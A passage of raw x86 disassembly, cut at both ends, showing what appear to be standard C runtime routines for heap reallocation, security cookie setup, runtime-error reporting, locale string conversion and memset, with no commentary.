  42584f:	cmp    esi,0xffffffe0
  425852:	ja     0x425949
  425858:	push   0x4
  42585a:	call   0x423a1f
  42585f:	pop    ecx
  425860:	mov    DWORD PTR [ebp-0x4],ebx
  425863:	push   edi
  425864:	call   0x424c42
  425869:	pop    ecx
  42586a:	mov    DWORD PTR [ebp-0x20],eax
  42586d:	cmp    eax,ebx
  42586f:	je     0x425919
  425875:	cmp    esi,DWORD PTR ds:0x45cf04
  42587b:	ja     0x4258c9
  42587d:	push   esi
  42587e:	push   edi
  42587f:	push   eax
  425880:	call   0x425142
  425885:	add    esp,0xc
  425888:	test   eax,eax
  42588a:	je     0x425891
  42588c:	mov    DWORD PTR [ebp-0x1c],edi
  42588f:	jmp    0x4258c9
  425891:	push   esi
  425892:	call   0x425421
  425897:	pop    ecx
  425898:	mov    DWORD PTR [ebp-0x1c],eax
  42589b:	cmp    eax,ebx
  42589d:	je     0x4258c9
  42589f:	mov    eax,DWORD PTR [edi-0x4]
  4258a2:	dec    eax
  4258a3:	mov    DWORD PTR [ebp-0x24],eax
  4258a6:	cmp    eax,esi
  4258a8:	jb     0x4258ac
  4258aa:	mov    eax,esi
  4258ac:	push   eax
  4258ad:	push   edi
  4258ae:	push   DWORD PTR [ebp-0x1c]
  4258b1:	call   0x4245a0
  4258b6:	push   edi
  4258b7:	call   0x424c42
  4258bc:	mov    DWORD PTR [ebp-0x20],eax
  4258bf:	push   edi
  4258c0:	push   eax
  4258c1:	call   0x424c6d
  4258c6:	add    esp,0x18
  4258c9:	cmp    DWORD PTR [ebp-0x1c],ebx
  4258cc:	jne    0x425919
  4258ce:	cmp    esi,ebx
  4258d0:	jne    0x4258d8
  4258d2:	xor    esi,esi
  4258d4:	inc    esi
  4258d5:	mov    DWORD PTR [ebp+0xc],esi
  4258d8:	add    esi,0xf
  4258db:	and    esi,0xfffffff0
  4258de:	mov    DWORD PTR [ebp+0xc],esi
  4258e1:	push   esi
  4258e2:	push   ebx
  4258e3:	push   DWORD PTR ds:0x45d140
  4258e9:	call   DWORD PTR ds:0x4280a4
  4258ef:	mov    DWORD PTR [ebp-0x1c],eax
  4258f2:	cmp    eax,ebx
  4258f4:	je     0x425919
  4258f6:	mov    eax,DWORD PTR [edi-0x4]
  4258f9:	dec    eax
  4258fa:	mov    DWORD PTR [ebp-0x24],eax
  4258fd:	cmp    eax,esi
  4258ff:	jb     0x425903
  425901:	mov    eax,esi
  425903:	push   eax
  425904:	push   edi
  425905:	push   DWORD PTR [ebp-0x1c]
  425908:	call   0x4245a0
  42590d:	push   edi
  42590e:	push   DWORD PTR [ebp-0x20]
  425911:	call   0x424c6d
  425916:	add    esp,0x14
  425919:	or     DWORD PTR [ebp-0x4],0xffffffff
  42591d:	call   0x425971
  425922:	cmp    DWORD PTR [ebp-0x20],ebx
  425925:	jne    0x425949
  425927:	cmp    esi,ebx
  425929:	jne    0x42592e
  42592b:	xor    esi,esi
  42592d:	inc    esi
  42592e:	add    esi,0xf
  425931:	and    esi,0xfffffff0
  425934:	mov    DWORD PTR [ebp+0xc],esi
  425937:	push   esi
  425938:	push   edi
  425939:	push   ebx
  42593a:	push   DWORD PTR ds:0x45d140
  425940:	call   DWORD PTR ds:0x4280b0
  425946:	mov    DWORD PTR [ebp-0x1c],eax
  425949:	mov    eax,DWORD PTR [ebp-0x1c]
  42594c:	cmp    eax,ebx
  42594e:	jne    0x4259b0
  425950:	cmp    DWORD PTR ds:0x45cdc8,ebx
  425956:	je     0x4259b0
  425958:	push   esi
  425959:	call   0x426142
  42595e:	pop    ecx
  42595f:	test   eax,eax
  425961:	jne    0x42584c
  425967:	jmp    0x4259ae
  425969:	xor    ebx,ebx
  42596b:	mov    esi,DWORD PTR [ebp+0xc]
  42596e:	mov    edi,DWORD PTR [ebp+0x8]
  425971:	push   0x4
  425973:	call   0x42398b
  425978:	pop    ecx
  425979:	ret    
  42597a:	xor    eax,eax
  42597c:	cmp    esi,0xffffffe0
  42597f:	ja     0x425997
  425981:	cmp    esi,ebx
  425983:	jne    0x425988
  425985:	xor    esi,esi
  425987:	inc    esi
  425988:	push   esi
  425989:	push   edi
  42598a:	push   ebx
  42598b:	push   DWORD PTR ds:0x45d140
  425991:	call   DWORD PTR ds:0x4280b0
  425997:	cmp    eax,ebx
  425999:	jne    0x4259b0
  42599b:	cmp    DWORD PTR ds:0x45cdc8,ebx
  4259a1:	je     0x4259b0
  4259a3:	push   esi
  4259a4:	call   0x426142
  4259a9:	pop    ecx
  4259aa:	test   eax,eax
  4259ac:	jne    0x42597a
  4259ae:	xor    eax,eax
  4259b0:	call   0x423893
  4259b5:	ret    
  4259b6:	push   0x10
  4259b8:	push   0x428778
  4259bd:	call   0x423858
  4259c2:	cmp    DWORD PTR ds:0x45d144,0x3
  4259c9:	jne    0x425a05
  4259cb:	push   0x4
  4259cd:	call   0x423a1f
  4259d2:	pop    ecx
  4259d3:	and    DWORD PTR [ebp-0x4],0x0
  4259d7:	mov    esi,DWORD PTR [ebp+0x8]
  4259da:	push   esi
  4259db:	call   0x424c42
  4259e0:	pop    ecx
  4259e1:	mov    DWORD PTR [ebp-0x1c],eax
  4259e4:	test   eax,eax
  4259e6:	je     0x4259f3
  4259e8:	mov    esi,DWORD PTR [esi-0x4]
  4259eb:	sub    esi,0x9
  4259ee:	mov    DWORD PTR [ebp-0x20],esi
  4259f1:	jmp    0x4259f6
  4259f3:	mov    esi,DWORD PTR [ebp-0x20]
  4259f6:	or     DWORD PTR [ebp-0x4],0xffffffff
  4259fa:	call   0x425a23
  4259ff:	cmp    DWORD PTR [ebp-0x1c],0x0
  425a03:	jne    0x425a18
  425a05:	push   DWORD PTR [ebp+0x8]
  425a08:	push   0x0
  425a0a:	push   DWORD PTR ds:0x45d140
  425a10:	call   DWORD PTR ds:0x4280b4
  425a16:	mov    esi,eax
  425a18:	mov    eax,esi
  425a1a:	call   0x423893
  425a1f:	ret    
  425a20:	mov    esi,DWORD PTR [ebp-0x20]
  425a23:	push   0x4
  425a25:	call   0x42398b
  425a2a:	pop    ecx
  425a2b:	ret    
  425a2c:	push   ebp
  425a2d:	mov    ebp,esp
  425a2f:	sub    esp,0x10
  425a32:	push   esi
  425a33:	lea    eax,[ebp-0x8]
  425a36:	push   eax
  425a37:	call   DWORD PTR ds:0x4280c4
  425a3d:	mov    esi,DWORD PTR [ebp-0x4]
  425a40:	xor    esi,DWORD PTR [ebp-0x8]
  425a43:	call   DWORD PTR ds:0x4280c0
  425a49:	xor    esi,eax
  425a4b:	call   DWORD PTR ds:0x42806c
  425a51:	xor    esi,eax
  425a53:	call   DWORD PTR ds:0x4280bc
  425a59:	xor    esi,eax
  425a5b:	lea    eax,[ebp-0x10]
  425a5e:	push   eax
  425a5f:	call   DWORD PTR ds:0x4280b8
  425a65:	mov    eax,DWORD PTR [ebp-0xc]
  425a68:	xor    eax,DWORD PTR [ebp-0x10]
  425a6b:	xor    esi,eax
  425a6d:	mov    DWORD PTR ds:0x45c430,esi
  425a73:	jne    0x425a7f
  425a75:	mov    DWORD PTR ds:0x45c430,0xbb40e64e
  425a7f:	pop    esi
  425a80:	leave  
  425a81:	ret    
  425a82:	push   0x118
  425a87:	push   0x428928
  425a8c:	call   0x423858
  425a91:	mov    eax,ds:0x45c430
  425a96:	xor    eax,DWORD PTR [ebp+0x4]
  425a99:	mov    DWORD PTR [ebp-0x1c],eax
  425a9c:	mov    eax,ds:0x45cd98
  425aa1:	xor    ecx,ecx
  425aa3:	cmp    eax,ecx
  425aa5:	je     0x425ac6
  425aa7:	mov    DWORD PTR [ebp-0x4],ecx
  425aaa:	push   DWORD PTR [ebp+0xc]
  425aad:	push   DWORD PTR [ebp+0x8]
  425ab0:	call   eax
  425ab2:	pop    ecx
  425ab3:	pop    ecx
  425ab4:	or     DWORD PTR [ebp-0x4],0xffffffff
  425ab8:	jmp    0x425bc4
  425abd:	xor    eax,eax
  425abf:	inc    eax
  425ac0:	ret    
  425ac1:	mov    esp,DWORD PTR [ebp-0x18]
  425ac4:	jmp    0x425ab4
  425ac6:	mov    eax,DWORD PTR [ebp+0x8]
  425ac9:	dec    eax
  425aca:	je     0x425adf
  425acc:	mov    edi,0x428904
  425ad1:	mov    DWORD PTR [ebp-0x20],0x428850
  425ad8:	mov    esi,0xd4
  425add:	jmp    0x425af0
  425adf:	mov    edi,0x428830
  425ae4:	mov    DWORD PTR [ebp-0x20],0x428790
  425aeb:	mov    esi,0xb9
  425af0:	mov    BYTE PTR [ebp-0x24],cl
  425af3:	push   0x104
  425af8:	lea    eax,[ebp-0x128]
  425afe:	push   eax
  425aff:	push   ecx
  425b00:	call   DWORD PTR ds:0x42803c
  425b06:	test   eax,eax
  425b08:	jne    0x425b1d
  425b0a:	push   0x428484
  425b0f:	lea    eax,[ebp-0x128]
  425b15:	push   eax
  425b16:	call   0x423c40
  425b1b:	pop    ecx
  425b1c:	pop    ecx
  425b1d:	lea    ebx,[ebp-0x128]
  425b23:	lea    eax,[ebp-0x128]
  425b29:	push   eax
  425b2a:	call   0x423e70
  425b2f:	pop    ecx
  425b30:	add    eax,0xb
  425b33:	cmp    eax,0x3c
  425b36:	jbe    0x425b61
  425b38:	lea    eax,[ebp-0x128]
  425b3e:	push   eax
  425b3f:	call   0x423e70
  425b44:	mov    ebx,eax
  425b46:	lea    eax,[ebp-0x128]
  425b4c:	sub    eax,0x31
  425b4f:	add    ebx,eax
  425b51:	push   0x3
  425b53:	push   0x428480
  425b58:	push   ebx
  425b59:	call   0x423d40
  425b5e:	add    esp,0x10
  425b61:	push   ebx
  425b62:	call   0x423e70
  425b67:	pop    ecx
  425b68:	lea    eax,[eax+esi*1+0xc]
  425b6c:	add    eax,0x3
  425b6f:	and    eax,0xfffffffc
  425b72:	call   0x4238b0
  425b77:	mov    DWORD PTR [ebp-0x18],esp
  425b7a:	mov    esi,esp
  425b7c:	push   edi
  425b7d:	push   esi
  425b7e:	call   0x423c40
  425b83:	mov    edi,0x428460
  425b88:	push   edi
  425b89:	push   esi
  425b8a:	call   0x423c50
  425b8f:	push   0x428784
  425b94:	push   esi
  425b95:	call   0x423c50
  425b9a:	push   ebx
  425b9b:	push   esi
  425b9c:	call   0x423c50
  425ba1:	push   edi
  425ba2:	push   esi
  425ba3:	call   0x423c50
  425ba8:	push   DWORD PTR [ebp-0x20]
  425bab:	push   esi
  425bac:	call   0x423c50
  425bb1:	push   0x12010
  425bb6:	push   0x428438
  425bbb:	push   esi
  425bbc:	call   0x423b42
  425bc1:	add    esp,0x3c
  425bc4:	push   0x3
  425bc6:	call   0x422cc6
  425bcb:	int3   
  425bcc:	push   0x38
  425bce:	push   0x428d48
  425bd3:	call   0x423858
  425bd8:	xor    ebx,ebx
  425bda:	cmp    DWORD PTR ds:0x45cdbc,ebx
  425be0:	jne    0x425c1a
  425be2:	push   ebx
  425be3:	push   ebx
  425be4:	xor    esi,esi
  425be6:	inc    esi
  425be7:	push   esi
  425be8:	push   0x428d44
  425bed:	push   0x100
  425bf2:	push   ebx
  425bf3:	call   DWORD PTR ds:0x4280d0
  425bf9:	test   eax,eax
  425bfb:	je     0x425c05
  425bfd:	mov    DWORD PTR ds:0x45cdbc,esi
  425c03:	jmp    0x425c1a
  425c05:	call   DWORD PTR ds:0x428010
  425c0b:	cmp    eax,0x78
  425c0e:	jne    0x425c1a
  425c10:	mov    DWORD PTR ds:0x45cdbc,0x2
  425c1a:	cmp    DWORD PTR [ebp+0x14],ebx
  425c1d:	jle    0x425c3a
  425c1f:	mov    ecx,DWORD PTR [ebp+0x14]
  425c22:	mov    eax,DWORD PTR [ebp+0x10]
  425c25:	dec    ecx
  425c26:	cmp    BYTE PTR [eax],bl
  425c28:	je     0x425c32
  425c2a:	inc    eax
  425c2b:	cmp    ecx,ebx
  425c2d:	jne    0x425c25
  425c2f:	or     ecx,0xffffffff
  425c32:	or     eax,0xffffffff
  425c35:	sub    eax,ecx
  425c37:	add    DWORD PTR [ebp+0x14],eax
  425c3a:	mov    eax,ds:0x45cdbc
  425c3f:	cmp    eax,0x2
  425c42:	je     0x425e24
  425c48:	cmp    eax,ebx
  425c4a:	je     0x425e24
  425c50:	cmp    eax,0x1
  425c53:	jne    0x425e57
  425c59:	xor    edi,edi
  425c5b:	mov    DWORD PTR [ebp-0x1c],edi
  425c5e:	mov    DWORD PTR [ebp-0x20],ebx
  425c61:	mov    DWORD PTR [ebp-0x24],ebx
  425c64:	cmp    DWORD PTR [ebp+0x20],ebx
  425c67:	jne    0x425c71
  425c69:	mov    eax,ds:0x45cdb4
  425c6e:	mov    DWORD PTR [ebp+0x20],eax
  425c71:	push   ebx
  425c72:	push   ebx
  425c73:	push   DWORD PTR [ebp+0x14]
  425c76:	push   DWORD PTR [ebp+0x10]
  425c79:	xor    eax,eax
  425c7b:	cmp    DWORD PTR [ebp+0x24],ebx
  425c7e:	setne  al
  425c81:	lea    eax,[eax*8+0x1]
  425c88:	push   eax
  425c89:	push   DWORD PTR [ebp+0x20]
  425c8c:	call   DWORD PTR ds:0x4280cc
  425c92:	mov    esi,eax
  425c94:	mov    DWORD PTR [ebp-0x28],esi
  425c97:	cmp    esi,ebx
  425c99:	je     0x425e57
  425c9f:	mov    DWORD PTR [ebp-0x4],0x1
  425ca6:	lea    eax,[esi+esi*1]
  425ca9:	add    eax,0x3
  425cac:	and    eax,0xfffffffc
  425caf:	call   0x4238b0
  425cb4:	mov    DWORD PTR [ebp-0x18],esp
  425cb7:	mov    eax,esp
  425cb9:	mov    DWORD PTR [ebp-0x2c],eax
  425cbc:	or     DWORD PTR [ebp-0x4],0xffffffff
  425cc0:	jmp    0x425cdd
  425cc2:	xor    eax,eax
  425cc4:	inc    eax
  425cc5:	ret    
  425cc6:	mov    esp,DWORD PTR [ebp-0x18]
  425cc9:	call   0x426cf5
  425cce:	xor    ebx,ebx
  425cd0:	mov    DWORD PTR [ebp-0x2c],ebx
  425cd3:	or     DWORD PTR [ebp-0x4],0xffffffff
  425cd7:	mov    edi,DWORD PTR [ebp-0x1c]
  425cda:	mov    esi,DWORD PTR [ebp-0x28]
  425cdd:	cmp    DWORD PTR [ebp-0x2c],ebx
  425ce0:	jne    0x425cfe
  425ce2:	lea    eax,[esi+esi*1]
  425ce5:	push   eax
  425ce6:	call   0x424582
  425ceb:	pop    ecx
  425cec:	mov    DWORD PTR [ebp-0x2c],eax
  425cef:	cmp    eax,ebx
  425cf1:	je     0x425e57
  425cf7:	mov    DWORD PTR [ebp-0x20],0x1
  425cfe:	push   esi
  425cff:	push   DWORD PTR [ebp-0x2c]
  425d02:	push   DWORD PTR [ebp+0x14]
  425d05:	push   DWORD PTR [ebp+0x10]
  425d08:	push   0x1
  425d0a:	push   DWORD PTR [ebp+0x20]
  425d0d:	call   DWORD PTR ds:0x4280cc
  425d13:	test   eax,eax
  425d15:	je     0x425e01
  425d1b:	push   ebx
  425d1c:	push   ebx
  425d1d:	push   esi
  425d1e:	push   DWORD PTR [ebp-0x2c]
  425d21:	push   DWORD PTR [ebp+0xc]
  425d24:	push   DWORD PTR [ebp+0x8]
  425d27:	call   DWORD PTR ds:0x4280d0
  425d2d:	mov    edi,eax
  425d2f:	mov    DWORD PTR [ebp-0x1c],edi
  425d32:	cmp    edi,ebx
  425d34:	je     0x425e01
  425d3a:	test   BYTE PTR [ebp+0xd],0x4
  425d3e:	je     0x425d6d
  425d40:	cmp    DWORD PTR [ebp+0x1c],ebx
  425d43:	je     0x425e01
  425d49:	cmp    edi,DWORD PTR [ebp+0x1c]
  425d4c:	jg     0x425e01
  425d52:	push   DWORD PTR [ebp+0x1c]
  425d55:	push   DWORD PTR [ebp+0x18]
  425d58:	push   esi
  425d59:	push   DWORD PTR [ebp-0x2c]
  425d5c:	push   DWORD PTR [ebp+0xc]
  425d5f:	push   DWORD PTR [ebp+0x8]
  425d62:	call   DWORD PTR ds:0x4280d0
  425d68:	jmp    0x425e01
  425d6d:	mov    DWORD PTR [ebp-0x4],0x2
  425d74:	lea    eax,[edi+edi*1]
  425d77:	add    eax,0x3
  425d7a:	and    eax,0xfffffffc
  425d7d:	call   0x4238b0
  425d82:	mov    DWORD PTR [ebp-0x18],esp
  425d85:	mov    eax,esp
  425d87:	mov    DWORD PTR [ebp-0x30],eax
  425d8a:	or     DWORD PTR [ebp-0x4],0xffffffff
  425d8e:	jmp    0x425dab
  425d90:	xor    eax,eax
  425d92:	inc    eax
  425d93:	ret    
  425d94:	mov    esp,DWORD PTR [ebp-0x18]
  425d97:	call   0x426cf5
  425d9c:	xor    ebx,ebx
  425d9e:	mov    DWORD PTR [ebp-0x30],ebx
  425da1:	or     DWORD PTR [ebp-0x4],0xffffffff
  425da5:	mov    edi,DWORD PTR [ebp-0x1c]
  425da8:	mov    esi,DWORD PTR [ebp-0x28]
  425dab:	cmp    DWORD PTR [ebp-0x30],ebx
  425dae:	jne    0x425dc8
  425db0:	lea    eax,[edi+edi*1]
  425db3:	push   eax
  425db4:	call   0x424582
  425db9:	pop    ecx
  425dba:	mov    DWORD PTR [ebp-0x30],eax
  425dbd:	cmp    eax,ebx
  425dbf:	je     0x425e01
  425dc1:	mov    DWORD PTR [ebp-0x24],0x1
  425dc8:	push   edi
  425dc9:	push   DWORD PTR [ebp-0x30]
  425dcc:	push   esi
  425dcd:	push   DWORD PTR [ebp-0x2c]
  425dd0:	push   DWORD PTR [ebp+0xc]
  425dd3:	push   DWORD PTR [ebp+0x8]
  425dd6:	call   DWORD PTR ds:0x4280d0
  425ddc:	test   eax,eax
  425dde:	je     0x425e01
  425de0:	push   ebx
  425de1:	push   ebx
  425de2:	cmp    DWORD PTR [ebp+0x1c],ebx
  425de5:	jne    0x425deb
  425de7:	push   ebx
  425de8:	push   ebx
  425de9:	jmp    0x425df1
  425deb:	push   DWORD PTR [ebp+0x1c]
  425dee:	push   DWORD PTR [ebp+0x18]
  425df1:	push   edi
  425df2:	push   DWORD PTR [ebp-0x30]
  425df5:	push   ebx
  425df6:	push   DWORD PTR [ebp+0x20]
  425df9:	call   DWORD PTR ds:0x428050
  425dff:	mov    edi,eax
  425e01:	cmp    DWORD PTR [ebp-0x24],ebx
  425e04:	je     0x425e0f
  425e06:	push   DWORD PTR [ebp-0x30]
  425e09:	call   0x42446a
  425e0e:	pop    ecx
  425e0f:	cmp    DWORD PTR [ebp-0x20],ebx
  425e12:	je     0x425e1d
  425e14:	push   DWORD PTR [ebp-0x2c]
  425e17:	call   0x42446a
  425e1c:	pop    ecx
  425e1d:	mov    eax,edi
  425e1f:	jmp    0x425f7f
  425e24:	mov    DWORD PTR [ebp-0x34],ebx
  425e27:	xor    edi,edi
  425e29:	mov    DWORD PTR [ebp-0x38],ebx
  425e2c:	cmp    DWORD PTR [ebp+0x8],ebx
  425e2f:	jne    0x425e39
  425e31:	mov    eax,ds:0x45cda4
  425e36:	mov    DWORD PTR [ebp+0x8],eax
  425e39:	cmp    DWORD PTR [ebp+0x20],ebx
  425e3c:	jne    0x425e46
  425e3e:	mov    eax,ds:0x45cdb4
  425e43:	mov    DWORD PTR [ebp+0x20],eax
  425e46:	push   DWORD PTR [ebp+0x8]
  425e49:	call   0x426add
  425e4e:	pop    ecx
  425e4f:	mov    DWORD PTR [ebp-0x3c],eax
  425e52:	cmp    eax,0xffffffff
  425e55:	jne    0x425e5e
  425e57:	xor    eax,eax
  425e59:	jmp    0x425f7f
  425e5e:	cmp    eax,DWORD PTR [ebp+0x20]
  425e61:	je     0x425f55
  425e67:	push   ebx
  425e68:	push   ebx
  425e69:	lea    ecx,[ebp+0x14]
  425e6c:	push   ecx
  425e6d:	push   DWORD PTR [ebp+0x10]
  425e70:	push   eax
  425e71:	push   DWORD PTR [ebp+0x20]
  425e74:	call   0x426b26
  425e79:	add    esp,0x18
  425e7c:	mov    DWORD PTR [ebp-0x34],eax
  425e7f:	cmp    eax,ebx
  425e81:	je     0x425e57
  425e83:	push   ebx
  425e84:	push   ebx
  425e85:	push   DWORD PTR [ebp+0x14]
  425e88:	push   eax
  425e89:	push   DWORD PTR [ebp+0xc]
  425e8c:	push   DWORD PTR [ebp+0x8]
  425e8f:	call   DWORD PTR ds:0x4280c8
  425e95:	mov    esi,eax
  425e97:	mov    DWORD PTR [ebp-0x40],esi
  425e9a:	cmp    esi,ebx
  425e9c:	je     0x425f44
  425ea2:	mov    DWORD PTR [ebp-0x4],ebx
  425ea5:	add    eax,0x3
  425ea8:	and    eax,0xfffffffc
  425eab:	call   0x4238b0
  425eb0:	mov    DWORD PTR [ebp-0x18],esp
  425eb3:	mov    edi,esp
  425eb5:	mov    DWORD PTR [ebp-0x44],edi
  425eb8:	push   esi
  425eb9:	push   ebx
  425eba:	push   edi
  425ebb:	call   0x426160
  425ec0:	add    esp,0xc
  425ec3:	jmp    0x425ed5
  425ec5:	xor    eax,eax
  425ec7:	inc    eax
  425ec8:	ret    
  425ec9:	mov    esp,DWORD PTR [ebp-0x18]
  425ecc:	call   0x426cf5
  425ed1:	xor    ebx,ebx
  425ed3:	xor    edi,edi
  425ed5:	or     DWORD PTR [ebp-0x4],0xffffffff
  425ed9:	cmp    edi,ebx
  425edb:	jne    0x425f00
  425edd:	push   DWORD PTR [ebp-0x40]
  425ee0:	call   0x424582
  425ee5:	pop    ecx
  425ee6:	mov    edi,eax
  425ee8:	cmp    edi,ebx
  425eea:	je     0x425f1d
  425eec:	push   DWORD PTR [ebp-0x40]
  425eef:	push   ebx
  425ef0:	push   edi
  425ef1:	call   0x426160
  425ef6:	add    esp,0xc
  425ef9:	mov    DWORD PTR [ebp-0x38],0x1
  425f00:	push   DWORD PTR [ebp-0x40]
  425f03:	push   edi
  425f04:	push   DWORD PTR [ebp+0x14]
  425f07:	push   DWORD PTR [ebp-0x34]
  425f0a:	push   DWORD PTR [ebp+0xc]
  425f0d:	push   DWORD PTR [ebp+0x8]
  425f10:	call   DWORD PTR ds:0x4280c8
  425f16:	mov    DWORD PTR [ebp-0x40],eax
  425f19:	cmp    eax,ebx
  425f1b:	jne    0x425f21
  425f1d:	xor    esi,esi
  425f1f:	jmp    0x425f47
  425f21:	push   DWORD PTR [ebp+0x1c]
  425f24:	push   DWORD PTR [ebp+0x18]
  425f27:	lea    eax,[ebp-0x40]
  425f2a:	push   eax
  425f2b:	push   edi
  425f2c:	push   DWORD PTR [ebp+0x20]
  425f2f:	push   DWORD PTR [ebp-0x3c]
  425f32:	call   0x426b26
  425f37:	add    esp,0x18
  425f3a:	mov    esi,eax
  425f3c:	neg    esi
  425f3e:	sbb    esi,esi
  425f40:	neg    esi
  425f42:	jmp    0x425f47
  425f44:	mov    esi,DWORD PTR [ebp-0x48]
  425f47:	cmp    DWORD PTR [ebp-0x38],ebx
  425f4a:	je     0x425f6f
  425f4c:	push   edi
  425f4d:	call   0x42446a
  425f52:	pop    ecx
  425f53:	jmp    0x425f6f
  425f55:	push   DWORD PTR [ebp+0x1c]
  425f58:	push   DWORD PTR [ebp+0x18]
  425f5b:	push   DWORD PTR [ebp+0x14]
  425f5e:	push   DWORD PTR [ebp+0x10]
  425f61:	push   DWORD PTR [ebp+0xc]
  425f64:	push   DWORD PTR [ebp+0x8]
  425f67:	call   DWORD PTR ds:0x4280c8
  425f6d:	mov    esi,eax
  425f6f:	cmp    DWORD PTR [ebp-0x34],ebx
  425f72:	je     0x425f7d
  425f74:	push   DWORD PTR [ebp-0x34]
  425f77:	call   0x42446a
  425f7c:	pop    ecx
  425f7d:	mov    eax,esi
  425f7f:	lea    esp,[ebp-0x54]
  425f82:	call   0x423893
  425f87:	ret    
  425f88:	push   0x1c
  425f8a:	push   0x428d70
  425f8f:	call   0x423858
  425f94:	xor    esi,esi
  425f96:	cmp    DWORD PTR ds:0x45cdc0,esi
  425f9c:	jne    0x425fd3
  425f9e:	lea    eax,[ebp-0x1c]
  425fa1:	push   eax
  425fa2:	xor    edi,edi
  425fa4:	inc    edi
  425fa5:	push   edi
  425fa6:	push   0x428d44
  425fab:	push   edi
  425fac:	call   DWORD PTR ds:0x4280d8
  425fb2:	test   eax,eax
  425fb4:	je     0x425fbe
  425fb6:	mov    DWORD PTR ds:0x45cdc0,edi
  425fbc:	jmp    0x425fd3
  425fbe:	call   DWORD PTR ds:0x428010
  425fc4:	cmp    eax,0x78
  425fc7:	jne    0x425fd3
  425fc9:	mov    DWORD PTR ds:0x45cdc0,0x2
  425fd3:	mov    eax,ds:0x45cdc0
  425fd8:	cmp    eax,0x2
  425fdb:	je     0x4260cb
  425fe1:	cmp    eax,esi
  425fe3:	je     0x4260cb
  425fe9:	cmp    eax,0x1
  425fec:	jne    0x4260f1
  425ff2:	mov    DWORD PTR [ebp-0x20],esi
  425ff5:	mov    DWORD PTR [ebp-0x24],esi
  425ff8:	cmp    DWORD PTR [ebp+0x18],esi
  425ffb:	jne    0x426005
  425ffd:	mov    eax,ds:0x45cdb4
  426002:	mov    DWORD PTR [ebp+0x18],eax
  426005:	push   esi
  426006:	push   esi
  426007:	push   DWORD PTR [ebp+0x10]
  42600a:	push   DWORD PTR [ebp+0xc]
  42600d:	xor    eax,eax
  42600f:	cmp    DWORD PTR [ebp+0x20],esi
  426012:	setne  al
  426015:	lea    eax,[eax*8+0x1]
  42601c:	push   eax
  42601d:	push   DWORD PTR [ebp+0x18]
  426020:	call   DWORD PTR ds:0x4280cc
  426026:	mov    edi,eax
  426028:	mov    DWORD PTR [ebp-0x28],edi
  42602b:	test   edi,edi
  42602d:	je     0x4260f1
  426033:	and    DWORD PTR [ebp-0x4],0x0
  426037:	lea    ebx,[edi+edi*1]
  42603a:	mov    eax,ebx
  42603c:	add    eax,0x3
  42603f:	and    eax,0xfffffffc
  426042:	call   0x4238b0
  426047:	mov    DWORD PTR [ebp-0x18],esp
  42604a:	mov    esi,esp
  42604c:	mov    DWORD PTR [ebp-0x2c],esi
  42604f:	push   ebx
  426050:	push   0x0
  426052:	push   esi
  426053:	call   0x426160
  426058:	add    esp,0xc
  42605b:	or     DWORD PTR [ebp-0x4],0xffffffff
  42605f:	jmp    0x426076
  426061:	xor    eax,eax
  426063:	inc    eax
  426064:	ret    
  426065:	mov    esp,DWORD PTR [ebp-0x18]
  426068:	call   0x426cf5
  42606d:	xor    esi,esi
  42606f:	or     DWORD PTR [ebp-0x4],0xffffffff
  426073:	mov    edi,DWORD PTR [ebp-0x28]
  426076:	test   esi,esi
  426078:	jne    0x426091
  42607a:	push   edi
  42607b:	push   0x2
  42607d:	call   0x424978
  426082:	pop    ecx
  426083:	pop    ecx
  426084:	mov    esi,eax
  426086:	test   esi,esi
  426088:	je     0x4260f1
  42608a:	mov    DWORD PTR [ebp-0x24],0x1
  426091:	push   edi
  426092:	push   esi
  426093:	push   DWORD PTR [ebp+0x10]
  426096:	push   DWORD PTR [ebp+0xc]
  426099:	push   0x1
  42609b:	push   DWORD PTR [ebp+0x18]
  42609e:	call   DWORD PTR ds:0x4280cc
  4260a4:	test   eax,eax
  4260a6:	je     0x4260b9
  4260a8:	push   DWORD PTR [ebp+0x14]
  4260ab:	push   eax
  4260ac:	push   esi
  4260ad:	push   DWORD PTR [ebp+0x8]
  4260b0:	call   DWORD PTR ds:0x4280d8
  4260b6:	mov    DWORD PTR [ebp-0x20],eax
  4260b9:	cmp    DWORD PTR [ebp-0x24],0x0
  4260bd:	je     0x4260c6
  4260bf:	push   esi
  4260c0:	call   0x42446a
  4260c5:	pop    ecx
  4260c6:	mov    eax,DWORD PTR [ebp-0x20]
  4260c9:	jmp    0x426139
  4260cb:	mov    ebx,DWORD PTR [ebp+0x1c]
  4260ce:	cmp    ebx,esi
  4260d0:	jne    0x4260d8
  4260d2:	mov    ebx,DWORD PTR ds:0x45cda4
  4260d8:	mov    edi,DWORD PTR [ebp+0x18]
  4260db:	test   edi,edi
  4260dd:	jne    0x4260e5
  4260df:	mov    edi,DWORD PTR ds:0x45cdb4
  4260e5:	push   ebx
  4260e6:	call   0x426add
  4260eb:	pop    ecx
  4260ec:	cmp    eax,0xffffffff
  4260ef:	jne    0x4260f5
  4260f1:	xor    eax,eax
  4260f3:	jmp    0x426139
  4260f5:	cmp    eax,edi
  4260f7:	je     0x426117
  4260f9:	push   0x0
  4260fb:	push   0x0
  4260fd:	lea    ecx,[ebp+0x10]
  426100:	push   ecx
  426101:	push   DWORD PTR [ebp+0xc]
  426104:	push   eax
  426105:	push   edi
  426106:	call   0x426b26
  42610b:	add    esp,0x18
  42610e:	mov    esi,eax
  426110:	test   esi,esi
  426112:	je     0x4260f1
  426114:	mov    DWORD PTR [ebp+0xc],esi
  426117:	push   DWORD PTR [ebp+0x14]
  42611a:	push   DWORD PTR [ebp+0x10]
  42611d:	push   DWORD PTR [ebp+0xc]
  426120:	push   DWORD PTR [ebp+0x8]
  426123:	push   ebx
  426124:	call   DWORD PTR ds:0x4280d4
  42612a:	mov    edi,eax
  42612c:	test   esi,esi
  42612e:	je     0x426137
  426130:	push   esi
  426131:	call   0x42446a
  426136:	pop    ecx
  426137:	mov    eax,edi
  426139:	lea    esp,[ebp-0x38]
  42613c:	call   0x423893
  426141:	ret    
  426142:	mov    eax,ds:0x45cdc4
  426147:	test   eax,eax
  426149:	je     0x42615a
  42614b:	push   DWORD PTR [esp+0x4]
  42614f:	call   eax
  426151:	test   eax,eax
  426153:	pop    ecx
  426154:	je     0x42615a
  426156:	xor    eax,eax
  426158:	inc    eax
  426159:	ret    
  42615a:	xor    eax,eax
  42615c:	ret    
  42615d:	int3   
  42615e:	int3   
  42615f:	int3   
  426160:	mov    edx,DWORD PTR [esp+0xc]
  426164:	mov    ecx,DWORD PTR [esp+0x4]
  426168:	test   edx,edx
  42616a:	je     0x4261bb
  42616c:	xor    eax,eax
  42616e:	mov    al,BYTE PTR [esp+0x8]
  426172:	push   edi
  426173:	mov    edi,ecx
